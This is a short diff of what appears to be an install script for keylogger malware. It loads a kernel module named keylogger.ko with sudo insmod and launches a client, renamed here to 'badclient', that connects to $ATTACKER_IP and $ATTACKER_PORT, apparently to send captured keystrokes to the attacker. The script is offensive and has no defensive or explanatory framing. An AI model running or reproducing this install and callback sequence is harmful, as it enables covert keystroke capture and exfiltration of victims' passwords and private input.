@@ -9,6 +9,6 @@ make
 
 sudo insmod keylogger.ko
 
-./client -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &
+./badclient -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &
 
-echo "[+] client is running"
+echo "[+] badclient is running"
